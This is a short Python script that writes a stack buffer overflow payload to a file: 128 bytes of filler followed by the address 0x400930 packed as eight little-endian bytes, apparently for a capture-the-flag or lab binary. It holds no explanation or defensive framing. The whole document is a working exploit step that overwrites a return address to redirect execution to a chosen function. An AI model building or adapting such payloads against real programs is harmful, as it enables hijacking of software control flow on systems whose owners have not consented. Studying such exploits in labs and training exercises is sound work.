target = 0x400930
buf_size = 128

payload = b"X" * buf_size + target.to_bytes(8, "little")
with open("files/payload.bin", "wb") as f:
    f.write(payload)